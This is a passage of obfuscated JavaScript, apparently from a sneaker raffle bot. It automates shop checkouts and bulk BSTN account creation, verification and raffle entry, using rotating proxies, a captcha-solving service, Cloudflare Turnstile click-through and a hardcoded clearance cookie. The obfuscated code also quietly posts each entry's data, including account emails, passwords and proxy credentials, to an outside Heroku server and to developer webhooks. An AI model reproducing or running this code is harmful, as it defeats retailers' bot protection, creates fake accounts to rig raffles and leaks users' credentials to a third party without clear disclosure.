_0x2bf4cc[_0x8d964c]['City']), await _0x252d06['waitForTimeout'](0x2bc);
                        if (_0x2bf4cc[_0x8d964c]['State'] != '')
                            try {
                                const _0x2faf81 = JSON['parse'](_0x223df9['readFileSync']('States.json', 'utf8'));
                                await _0x41ed31(0x1f4);
                                if (_0x2bf4cc[_0x8d964c]['State']['length'] > 0x2)
                                    for (let _0x2466b1 of _0x2faf81) {
                                        if (_0x2466b1['Province'] == _0x2bf4cc[_0x8d964c]['State']) {
                                            await _0x252d06['select']('#checkout_shipping_address_province', _0x2466b1['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0x252d06['select']('#checkout_shipping_address_province', _0x2bf4cc[_0x8d964c]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0x41ed31(0x1f4), console['log'](_0x82e5a5() + '\x20[' + _0x34d987['name'] + ']\x20Task\x20' + (_0x8d964c + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x41ed31(0x190), _0x252d06['evaluate'](() => {
                            const _0x39e234 = document['querySelector']('#continue_button');
                            for (var _0x22a66e = 0x0; _0x22a66e < 0x5; _0x22a66e++) {
                                if (_0x39e234) {
                                    _0x39e234['click'](), _0x39e234['click']();
                                    break;
                                } else
                                    _0x41ed31(0xfa0);
                            }
                        }), await _0x252d06['waitForTimeout'](0x9c4);
                        try {
                            await _0x252d06['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0x252d06['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x417324 => _0x417324['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x252d06['waitForTimeout'](0x7d0), console['log'](_0x82e5a5() + '\x20[' + _0x34d987['name'] + ']\x20Task\x20' + (_0x8d964c + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0x252d06['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x41ed31(0x3e8), await _0x252d06['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x532ba6 => _0x532ba6['submit']()), await _0x41ed31(0x3e8);
                        try {
                            await _0x252d06['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x252d06['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x53d28f => _0x53d28f['submit']());
                        try {
                            await _0x252d06['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x3fb761 = 'no', _0x13e83d(_0x2bf4cc[_0x8d964c], _0x34d987), console['log'](_0x3dfcf2['green'](_0x82e5a5() + '\x20[' + _0x34d987['name'] + ']\x20Task\x20' + (_0x8d964c + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '')
                                try {
                                    await _0x48936e(_0x4ae33b['webhook'], _0x40235f['succesDEVMSG']);
                                } catch {
                                }
                            await _0x41ed31(0xc8), await _0x48936e(_0x3a625c, _0x40235f['succesDEVMSG']), await _0x41ed31(0xc8);
                            try {
                                await _0x48936e(_0x22a07c, _0x40235f['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0x128b96['replace']('#', ''),
                                    'module': _0x34d987['name'],
                                    'entrydata': JSON['stringify'](_0x4322f1),
                                    'proxy': '' + _0x536ce1[_0x8d964c]
                                };
                                var _0x64cd7f = JSON['stringify'](prxdata);
                                let _0x5addbd = { 'headers': { 'content-type': 'application/json' } };
                                await _0x48af5a['post']('https://jraffles.herokuapp.com/success', _0x64cd7f, _0x5addbd);
                            } catch (_0x2bd2fe) {
                            }
                        } catch (_0x1d10a0) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0x5558c6) {
                        _0x5558c6['message']['includes']('selector') && (_0x5558c6 = 'Connection\x20Error');
                        console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x34d987['name'] + ']\x20Task\x20' + (_0x8d964c + 0x1) + '\x20:\x20' + _0x5558c6)), _0x45127e = '' + _0x5558c6;
                        var _0x1fef64 = await _0x559dec(_0x2bf4cc[_0x8d964c], _0x34d987, 'dev', !![], _0x45127e);
                        _0x40235f['errorDEV'] = { 'embeds': [_0x1fef64] }, _0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '' && await _0x48936e(_0x4ae33b['webhook'], _0x40235f['errorDEV']), await _0x48936e(_0x36657d, _0x40235f['errorDEV']), _0x3fb761 = 'yes';
                    } finally {
                        _0x2a52c5 && _0x2a52c5['close']();
                        if (_0x3fb761 == 'yes' && _0x18ffe2 != 0x5 && _0x45127e != 'Size\x20Not\x20Found') {
                            console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x34d987['name'] + ']\x20Task\x20' + (_0x8d964c + 0x1) + '\x20:\x20Retrying\x20(' + _0x18ffe2 + '\x20/\x205)')), _0x8d964c = _0x8d964c - 0x1, _0x18ffe2 = _0x18ffe2 + 0x1;
                            continue;
                        }
                        _0x3fb761 == 'yes' && _0x18ffe2 >= 0x5 && (_0x2504ad(_0x2bf4cc[_0x8d964c], _0x34d987), _0x3fb761 = 'no', _0x18ffe2 = 0x0);
                        if (_0x8d964c + 0x1 == _0x2bf4cc['length']) {
                            await _0x41ed31(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x4ae33b['AfewDelay'] + '\x20ms'), await _0x41ed31(_0x4ae33b['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x103047, _0x3e9f26, _0xaf5b18) {
                    var _0x1dff06 = _0x3e9f26, _0x4d7636 = 0x0;
                    for (var _0x380e93 = 0x0; _0x380e93 < _0x3e9f26['length']; _0x380e93++) {
                        maxTasks = Number(_0x4ae33b['threads']);
                        while (_0x4d7636 >= maxTasks) {
                            await _0x41ed31(_0x4ae33b['delay']);
                        }
                        async function _0x53b1fd(_0x3f8c69, _0x46bdff, _0x39fb86, _0x5d475b, _0x3af5ad) {
                            _0x4d7636++, _0x23e690['use'](_0x57a02e()), _0x23e690['use'](_0x2aeb7e({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x4ae33b['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0xb98dea;
                            try {
                                await _0x101e1b(_0x46bdff, _0x5d475b);
                            } catch {
                                retry = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x445891(_0x3f8c69['name'] + '\x20Task\x20' + (_0x5d475b + 0x1) + '\x20/\x20' + _0x46bdff['length'] + '\x20||\x20File:\x20' + _0x4d7b48 + '\x20Proxies:\x20' + _0x2bc9a5);
                            var _0x248ebc = await _0x559dec(_0x46bdff[_0x5d475b], _0x3f8c69, 'acc', ![]);
                            const _0x4649c0 = { 'succesDEVMSG': { 'embeds': [_0x248ebc] } }, _0x257d1a = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x2ffcbd = Math['round'](Math['random']() * (_0x39fb86['length'] - 0x1)), _0x1d66f4 = _0x39fb86[_0x2ffcbd]['split'](':'), _0x22671d;
                            try {
                                _0x22671d = await _0x23e690['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x1d66f4[0x0] + ':' + _0x1d66f4[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x22671d = await _0x23e690['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x1d66f4[0x0] + ':' + _0x1d66f4[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x5c7031 = await _0x22671d['newPage']();
                                await _0x5c7031['authenticate']({
                                    'username': '' + _0x1d66f4[0x2],
                                    'password': '' + _0x1d66f4[0x3]
                                }), console['log'](_0x82e5a5() + '\x20[' + _0x3f8c69['name'] + ']\x20Task\x20' + (_0x5d475b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5c7031['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x5c7031['setRequestInterception'](!![]), _0x5c7031['on']('request', _0x3721dd => {
                                    _0x3721dd['resourceType']() === 'image' ? _0x3721dd['abort']() : _0x3721dd['continue']();
                                });
                                try {
                                    await _0x5c7031['goto']('' + _0x257d1a), await _0x5c7031['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    retry = 'yes';
                                    throw new Error('Proxy\x20Error');
                                }
                                await _0x5c7031['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x82e5a5() + '\x20[' + _0x3f8c69['name'] + ']\x20Task\x20' + (_0x5d475b + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x41ed31(0x7d0), console['log'](_0x82e5a5() + '\x20[' + _0x3f8c69['name'] + ']\x20Task\x20' + (_0x5d475b + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x41ed31(0x190), await _0x5c7031['waitForSelector']('#firstname'), await _0x5c7031['focus']('#firstname'), await _0x5c7031['keyboard']['down']('Control'), await _0x5c7031['keyboard']['press']('A'), await _0x41ed31(0xc8), await _0x5c7031['keyboard']['up']('Control'), await _0x5c7031['keyboard']['press']('Backspace'), await _0x5c7031['type']('#firstname', _0x46bdff[_0x5d475b]['FirstName'], { 'delay': 0xf0 }), await _0x41ed31(0x190), await _0x5c7031['focus']('#lastname'), await _0x5c7031['keyboard']['down']('Control'), await _0x5c7031['keyboard']['press']('A'), await _0x41ed31(0xc8), await _0x5c7031['keyboard']['up']('Control'), await _0x5c7031['keyboard']['press']('Backspace'), await _0x5c7031['type']('#lastname', _0x46bdff[_0x5d475b]['LastName'], { 'delay': 0xe6 }), await _0x41ed31(0x190), await _0x5c7031['focus']('#email_address'), await _0x5c7031['keyboard']['down']('Control'), await _0x5c7031['keyboard']['press']('A'), await _0x41ed31(0xc8), await _0x5c7031['keyboard']['up']('Control'), await _0x5c7031['keyboard']['press']('Backspace'), await _0x5c7031['type']('#email_address', _0x46bdff[_0x5d475b]['Email'], { 'delay': 0x122 }), await _0x41ed31(0x190), await _0x5c7031['type']('#password', _0x46bdff[_0x5d475b]['Password'], { 'delay': 0x82 }), await _0x41ed31(0x1f4), await _0x5c7031['type']('#password-confirmation', _0x46bdff[_0x5d475b]['Password'], { 'delay': 0x7c }), console['log'](_0x82e5a5() + '\x20[' + _0x3f8c69['name'] + ']\x20Task\x20' + (_0x5d475b + 0x1) + '\x20:\x20Sending\x20Request'), await _0x41ed31(0x2bc), await _0x5c7031['$eval']('#form-validate', _0x1aca3e => _0x1aca3e['submit']()), await _0x41ed31(0x1388);
                                const _0x15091a = await _0x5c7031['$']('#email_address-error');
                                if (_0x15091a)
                                    throw new Error('Invalid\x20Email');
                                const _0x3aa5dd = await _0x5c7031['$']('#password-error');
                                if (_0x3aa5dd)
                                    throw new Error('Invalid\x20Password');
                                await _0x5c7031['waitForSelector']('div.mesg-success'), retry = 'no', console['log'](_0x3dfcf2['green'](_0x82e5a5() + '\x20[' + _0x3f8c69['name'] + ']\x20Task\x20' + (_0x5d475b + 0x1) + '\x20:\x20Account\x20' + _0x46bdff[_0x5d475b]['Email'] + '\x20Generated')), _0x223df9['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x46bdff[_0x5d475b]['Email'] + ',' + _0x46bdff[_0x5d475b]['Password']);
                                try {
                                    _0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '' && await _0x48936e(_0x4ae33b['webhook'], _0x4649c0['succesDEVMSG']);
                                } catch {
                                }
                                await _0x48936e(_0x1041df, _0x4649c0['succesDEVMSG']);
                                let _0x4fb0be = _0x46bdff[_0x5d475b];
                                try {
                                    prxdata = {
                                        'username': _0x128b96['replace']('#', ''),
                                        'module': _0x3f8c69['name'],
                                        'entrydata': JSON['stringify'](_0x4fb0be),
                                        'proxy': '' + _0x39fb86[_0x5d475b]
                                    };
                                    var _0xfd7c6d = JSON['stringify'](prxdata);
                                    let _0x38a94c = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x48af5a['post']('https://jraffles.herokuapp.com/success', _0xfd7c6d, _0x38a94c);
                                } catch (_0x1fa2d0) {
                                }
                                console['log'](_0x3dfcf2['yellow'](_0x82e5a5() + '\x20[' + _0x3f8c69['name'] + ']\x20Task\x20' + (_0x5d475b + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                            } catch (_0x20b520) {
                                console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x3f8c69['name'] + ']\x20Task\x20' + (_0x5d475b + 0x1) + '\x20:\x20' + _0x20b520)), _0xb98dea = '' + _0x20b520;
                                var _0x175573 = await _0x559dec(_0x46bdff[_0x5d475b], _0x3f8c69, 'acc', !![], _0xb98dea);
                                _0x4649c0['errorDEV'] = { 'embeds': [_0x175573] }, _0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '' && await _0x48936e(_0x4ae33b['webhook'], _0x4649c0['errorDEV']), await _0x48936e(_0x36657d, _0x4649c0['errorDEV']), retry = 'yes';
                            } finally {
                                if (_0x22671d)
                                    _0x22671d['close']();
                                if (retry == 'yes' && _0x3af5ad != 0x5)
                                    return console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x3f8c69['name'] + ']\x20Task\x20' + (_0x5d475b + 0x1) + '\x20:\x20Retrying\x20(' + (_0x3af5ad + 0x1) + '\x20/\x205)')), _0x4d7636--, _0x3af5ad = _0x3af5ad + 0x1, _0x53b1fd(_0x3f8c69, _0x46bdff, _0x39fb86, _0x5d475b, _0x3af5ad);
                                retry == 'yes' && _0x3af5ad >= 0x5 && (_0x2504ad(_0x46bdff[_0x5d475b], _0x3f8c69), retry = 'no', _0x3af5ad = 0x0), _0x4d7636--, console['log'](_0x82e5a5() + '\x20[' + _0x3f8c69['name'] + ']\x20Waiting\x20for\x20' + _0x4ae33b['delay'] + '\x20ms'), await _0x41ed31(_0x4ae33b['delay']);
                            }
                        }
                        _0x53b1fd(_0x103047, _0x1dff06, _0xaf5b18, _0x380e93, 0x0), await _0x41ed31(0x190);
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x5ba846, _0x4a80f3) {
                    var _0x258a8f = ![], _0x595d51 = [], _0x3a3684 = 0x0;
                    async function _0x27dc03() {
                        var _0x1c82b6 = new _0x2fa2c3({
                            'user': _0x4ae33b['masterMail'],
                            'password': _0x4ae33b['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x40e4eb(_0xb4ccd7) {
                            _0x1c82b6['openBox']('INBOX', ![], _0xb4ccd7);
                        }
                        _0x1c82b6['once']('ready', function () {
                            _0x40e4eb(function (_0x5ef187, _0x1085af) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x5ef187)
                                    throw _0x5ef187;
                                _0x1c82b6['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x28989f, _0x1832b5) {
                                    if (!_0x1832b5 || !_0x1832b5['length'])
                                        console['log'](_0x82e5a5() + '\x20[' + _0x5ba846['name'] + ']\x20No\x20mails\x20found'), _0x1c82b6['end']();
                                    else {
                                        var _0x27d221 = _0x1c82b6['seq']['fetch'](_0x1832b5, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x27d221['on']('message', function (_0x44b238, _0x5bcf25) {
                                            var _0x5de7a8 = '(#' + _0x5bcf25 + ')\x20';
                                            _0x44b238['on']('body', function (_0x1a44e6, _0x574b95) {
                                                _0x44103a(_0x1a44e6, (_0x4f32c3, _0x1e8300) => {
                                                    var _0x4c6f69 = _0x1e8300['text']['split']('customer/account/confirm/')[0x1], _0x24ea7f = _0x4c6f69['split'](']')[0x0];
                                                    _0x595d51['push']('https://www.bstn.com/eu_en/customer/account/confirm/' + _0x24ea7f);
                                                });
                                            }), _0x44b238['once']('end', function () {
                                            });
                                        }), _0x27d221['once']('error', function (_0xf097fe) {
                                            console['log']('Fetch\x20error:\x20' + _0xf097fe), _0x258a8f = !![];
                                        }), _0x27d221['once']('end', function () {
                                            _0x1c82b6['end'](), _0x258a8f = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x1c82b6['once']('error', function (_0x1f2ab4) {
                            console['log'](_0x3dfcf2['red'](_0x1f2ab4['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x258a8f = !![];
                        }), _0x1c82b6['once']('end', async function () {
                            _0x258a8f = !![];
                        }), _0x1c82b6['connect']();
                    }
                    try {
                        _0x27dc03();
                        while (!_0x258a8f) {
                            await _0x41ed31(0xfa0);
                        }
                        console['log']('Found\x20' + _0x595d51['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x41ed31(0x7d0);
                    }
                    for (var _0x4a902a = 0x0; _0x4a902a < _0x595d51['length']; _0x4a902a++) {
                        maxTasks = Number(_0x4ae33b['threads']);
                        while (_0x3a3684 >= maxTasks) {
                            await _0x41ed31(_0x4ae33b['delay']);
                        }
                        async function _0x32e791(_0xfff754, _0x577629, _0x316055, _0x1dea26, _0x2616b2) {
                            _0x3a3684++, _0x23e690['use'](_0x57a02e());
                            if (_0xa7681f != 'yes')
                                var _0xa7681f = '', _0x2616b2 = 0x0;
                            var _0xe80cdc = Math['round'](Math['random']() * (_0x316055['length'] - 0x1)), _0x2b8584 = _0x316055[_0xe80cdc]['split'](':'), _0x4aaac4;
                            try {
                                _0x4aaac4 = await _0x23e690['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x2b8584[0x0] + ':' + _0x2b8584[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x4aaac4 = await _0x23e690['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x2b8584[0x0] + ':' + _0x2b8584[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x5c7e8 = await _0x4aaac4['newPage']();
                                await _0x5c7e8['authenticate']({
                                    'username': '' + _0x2b8584[0x2],
                                    'password': '' + _0x2b8584[0x3]
                                }), console['log'](_0x82e5a5() + '\x20[' + _0xfff754['name'] + ']\x20Task\x20' + (_0x1dea26 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x5c7e8['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x5c7e8['setRequestInterception'](!![]), _0x5c7e8['on']('request', _0x348e33 => {
                                    _0x348e33['resourceType']() === 'image' || _0x348e33['resourceType']() === 'font' || _0x348e33['resourceType']() === 'media' ? _0x348e33['abort']() : _0x348e33['continue']();
                                }), console['log'](_0x82e5a5() + '\x20[' + _0xfff754['name'] + ']\x20Task\x20' + (_0x1dea26 + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0x5c7e8['goto'](_0x577629[_0x1dea26]);
                                } catch (_0x538c69) {
                                    _0xa7681f = 'yes';
                                    throw new Error('\x27Connection\x20Error\x27\x20' + _0x538c69);
                                }
                                console['log'](_0x82e5a5() + '\x20[' + _0xfff754['name'] + ']\x20Task\x20' + (_0x1dea26 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x5c7e8['waitForTimeout'](0xbb8);
                                try {
                                    await _0x5c7e8['waitForSelector']('.account-nav'), _0xa7681f = 'no', console['log'](_0x3dfcf2['green'](_0x82e5a5() + '\x20[' + _0xfff754['name'] + ']\x20Task\x20' + (_0x1dea26 + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0xae0b59 = await _0x559dec(null, _0xfff754, 'ver', ![]);
                                    const _0x450c8c = { 'succesDEVMSG': { 'embeds': [_0xae0b59] } };
                                    await _0x48936e(_0x4b7487, _0x450c8c['succesDEVMSG']);
                                } catch {
                                    _0xa7681f = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0x4fe1da) {
                                console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0xfff754['name'] + ']\x20Task\x20' + (_0x1dea26 + 0x1) + '\x20:\x20' + _0x4fe1da));
                                var _0x162d26 = _0x4fe1da, _0x16053d = await _0x559dec(null, _0xfff754, 'ver', !![], _0x162d26);
                                const _0x42893f = { 'errorDEVMSG': { 'embeds': [_0x16053d] } };
                                _0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '' && await _0x48936e(_0x4ae33b['webhook'], _0x42893f['errorDEVMSG']), await _0x48936e(_0x36657d, _0x42893f['errorDEVMSG']);
                            } finally {
                                if (_0x4aaac4)
                                    _0x4aaac4['close']();
                                if (_0xa7681f == 'yes' && _0x2616b2 != 0x5)
                                    return console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0xfff754['name'] + ']\x20Task\x20' + (_0x1dea26 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2616b2 + '\x20/\x205)')), _0x3a3684--, _0x2616b2 = _0x2616b2 + 0x1, _0x32e791(_0xfff754, _0x577629, _0x316055, _0x1dea26, _0x2616b2);
                                _0xa7681f == 'yes' && _0x2616b2 >= 0x5 && (_0xa7681f = 'no', _0x2616b2 = 0x0), _0x3a3684--, console['log'](_0x82e5a5() + '\x20[' + _0xfff754['name'] + ']\x20Waiting\x20for\x20' + _0x4ae33b['delay'] + '\x20ms'), await _0x41ed31(_0x4ae33b['delay']);
                            }
                        }
                        if (_0x4a902a == _0x595d51['length'] - 0x1) {
                            await _0x32e791(_0x5ba846, _0x595d51, _0x4a80f3, _0x4a902a, 0x0);
                            return;
                        }
                        _0x32e791(_0x5ba846, _0x595d51, _0x4a80f3, _0x4a902a, 0x0), await _0x41ed31(0x12c);
                    }
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x454106, _0x35b903, _0x5047bf) {
                    var _0x573250 = 0x0, _0x1e0d50 = _0x35b903;
                    for (var _0x1eb88b = 0x0; _0x1eb88b < _0x35b903['length']; _0x1eb88b++) {
                        maxTasks = Number(_0x4ae33b['threads']);
                        while (_0x573250 >= maxTasks) {
                            await _0x41ed31(_0x4ae33b['delay']);
                        }
                        let _0x1b5cc7 = ![];
                        async function _0x3541f3(_0x49b9d0, _0xebbfb3, _0x12a81b, _0x541a12, _0x2963f1) {
                            _0x573250++, _0x23e690['use'](_0x57a02e()), _0x23e690['use'](_0x2aeb7e({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x4ae33b['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x538a99, _0x14b0a7 = _0xebbfb3[_0x541a12];
                            try {
                                await _0x101e1b(_0xebbfb3, _0x541a12);
                            } catch {
                                _0x4ad3b2 = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            async function _0x3ac33d(_0x1c9848) {
                                const _0x273902 = _0x223df9['readFileSync']('../successful-tasks.csv', 'utf8'), _0x1dfa8e = _0x57f277['parse'](_0x273902, { 'header': !![] })['data'];
                                let _0x446588 = ![];
                                for (var _0x5adabe of _0x1dfa8e) {
                                    if (_0x5adabe['Url'] == _0x1c9848['Url'] && _0x5adabe['Email'] == _0x1c9848['Email']) {
                                        _0x446588 = !![];
                                        break;
                                    }
                                }
                                return _0x446588;
                            }
                            _0x445891(_0x49b9d0['name'] + '\x20Task\x20' + (_0x541a12 + 0x1) + '\x20/\x20' + _0xebbfb3['length'] + '\x20||\x20File:\x20' + _0x4d7b48 + '\x20Proxies:\x20' + _0x2bc9a5);
                            var _0x2649c7 = Math['round'](Math['random']() * (_0x12a81b['length'] - 0x1)), _0x3964eb = _0x12a81b[_0x2649c7]['split'](':'), _0x11c753;
                            let _0x3032da = ![], _0x4ad3b2 = 'no';
                            try {
                                if (await _0x3ac33d(_0xebbfb3[_0x541a12]) == !![]) {
                                    console['log'](_0x82e5a5() + '\x20[' + _0x49b9d0['name'] + ']\x20Task\x20' + (_0x541a12 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x3032da = !![], _0x1b5cc7 = !![];
                                    return;
                                }
                                try {
                                    _0x11c753 = await _0x23e690['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x3964eb[0x0] + ':' + _0x3964eb[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x11c753 = await _0x23e690['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x3964eb[0x0] + ':' + _0x3964eb[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x1ff180 = await _0x11c753['newPage'](), _0x4d4b3f = await _0x1ff180['target']()['createCDPSession'](), { windowId: _0x2ca030 } = await _0x4d4b3f['send']('Browser.getWindowForTarget');
                                await _0x1ff180['setViewport']({
                                    'width': 0x501,
                                    'height': 0x2d0
                                });
                                var _0x1239af = [{
                                    'name': 'cf_clearance',
                                    'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                    'domain': '.bstn.com',
                                    'path': '/',
                                    'expires': 1707818183.331533,
                                    'httpOnly': !![],
                                    'secure': !![]
                                }];
                                await _0x1ff180['authenticate']({
                                    'username': '' + _0x3964eb[0x2],
                                    'password': '' + _0x3964eb[0x3]
                                }), console['log'](_0x82e5a5() + '\x20[' + _0x49b9d0['name'] + ']\x20Task\x20' + (_0x541a12 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1ff180['goto']('' + _0xebbfb3[_0x541a12]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x82e5a5() + '\x20[' + _0x49b9d0['name'] + ']\x20Task\x20' + (_0x541a12 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x41ed31(0x1388);
                                var _0x4caaae = await _0x1ff180['$']('#turnstile-wrapper');
                                if (_0x4caaae) {
                                    console['log'](_0x82e5a5() + '\x20[' + _0x49b9d0['name'] + ']\x20Task\x20' + (_0x541a12 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x41ed31(0x2710);
                                    const _0x298537 = await _0x1ff180['$']('#turnstile-wrapper');
                                    if (_0x298537)
                                        try {
                                            await _0x298537['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x1ff180['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0x111e30 = await _0x1ff180['$']('#turnstile-wrapper');
                                        if (_0x111e30)
                                            try {
                                                await _0x111e30['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x1ff180['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                                } catch {
                                    throw new Error('Blocked\x20by\x20Cloudflare');
                                }
                                await _0x4d4b3f['send']('Browser.setWindowBounds', {
                                    'windowId': _0x2ca030,
                                    'bounds': { 'windowState': 'minimized' }
